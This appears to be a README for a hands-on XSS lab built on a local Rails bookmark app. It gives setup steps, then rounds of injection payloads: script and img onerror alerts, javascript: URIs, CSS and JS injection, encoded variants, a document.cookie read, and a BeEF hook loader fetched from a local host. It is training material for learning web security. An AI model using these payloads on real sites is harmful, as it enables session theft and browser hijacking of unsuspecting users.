# XSS hands-on with Rails application

## Install


### Database

- Install postgresql

- Create role

```console
sudo -u postgres createuser -P <SYSTEM_USER_NAME>
```

- Create database

```console
sudo -u postgres createdb -O <SYSTEM_USER_NAME> db_dev
```

### Application

- Install dependencies

```console
bundle install
```

- Configure database

```console
rails db:migrate
```

- Run

```console
rails server
```

## Hack


### Round 1: insert HTML tags

- Add a bookmark with html tags in comment:

- Title: 

```
OWASP Cheat Sheet Series
```

- Link

```
https://cheatsheetseries.owasp.org
```

- Comment

```
The <b>OWASP Cheat Sheet Series</b> was created to provide a concise collection of high value information on specific application security topics.
```


### Round 2: using HTML Tag

In bookmark comment:

```
<script>alert(`XSS`)</script>
```

```
<iframe src="javascript:alert('XSS');">
```

```
<img src=1 href=1 onerror="javascript:alert('XSS')"></img>
```

Note: using simple HTML tags was too easy! Now, use different contexts for XSS execution.

### Round 3: using JS URI

In bookmark link field:

```
javascript:alert('XSS')
```


### Round 4: using CSS

In bookmark color fiels:

```
red; background: url(https://http.cat/200)
```

### Round 5: using javascript

Add a bookmark with the following order id:

```
22; alert(1);
```


### Round 6: Encoded XSS

- HTML Decimal entity

````
<img src=x onerror="&#106&#97&#118&#97&#115&#99&#114&#105&#112&#116&#58&#97&#108&#101&#114&#116&#40&#39&#88&#83&#83&#39&#41">
````

- UTF16

````
<img src="x" onerror="\u006A\u0061\u0076\u0061\u0073\u0063\u0072\u0069\u0070\u0074:\u0061\u006C\u0065\u0072\u0074('XSS')">
````



### Round 6: Steal Cookie :fearful:

Add a bookmark with script tags in comment to get session cookie

```
<script>alert(document.cookie)</script>
```

### Round 7: take controle with Beef :scream:

```
<img src=1 href=1 onerror="javascript: (function () { var url = 'http://127.0.0.1:4000/hook.js';if (typeof beef == 'undefined') { var bf = document.createElement('script'); bf.type = 'text/javascript'; bf.src = url; document.body.appendChild(bf);}})();" />
```